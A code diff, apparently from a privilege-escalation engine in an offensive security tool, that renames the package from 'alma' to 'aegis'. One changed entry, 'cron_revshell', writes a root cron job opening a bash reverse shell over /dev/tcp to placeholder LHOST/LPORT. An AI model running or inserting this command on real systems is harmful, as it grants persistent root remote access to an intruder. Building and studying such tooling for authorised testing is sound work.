@@ -6,8 +6,8 @@ import json
 from dataclasses import dataclass, field, asdict
 from typing import Any
 
-from alma.core.session import Session
-from alma.utils.logger import AlmaLogger
+from aegis.core.session import Session
+from aegis.utils.logger import AegisLogger
 
 
 @dataclass
@@ -286,7 +286,7 @@ COMMAND_ACTIONS: dict[str, list[PrivescCommand]] = {
             name="cron_revshell",
             description="Write revshell cron job",
             commands=[
-                "echo '* * * * * root bash -c \"exec 3<>/dev/tcp/LHOST/LPORT; cat <&3 | bash >&3 2>&3\"' > /etc/cron.d/alma_rev",
+                "echo '* * * * * root bash -c \"exec 3<>/dev/tcp/LHOST/LPORT; cat <&3 | bash >&3 2>&3\"' > /etc/cron.d/aegis_rev",
             ],
             risk="high", confidence=0.8,
         ),
@@ -320,7 +320,7 @@ COMMAND_ACTIONS: dict[str, list[PrivescCommand]] = {
 
 class PrivescEngine:
     def __init__(self) -> None:
-        self._log = AlmaLogger("privesc").get()
+        self._log = AegisLogger("privesc").get()
 
     def all_checks(self, os_type: str = "linux") -> list[PrivescCheck]:
         if os_type == "linux":
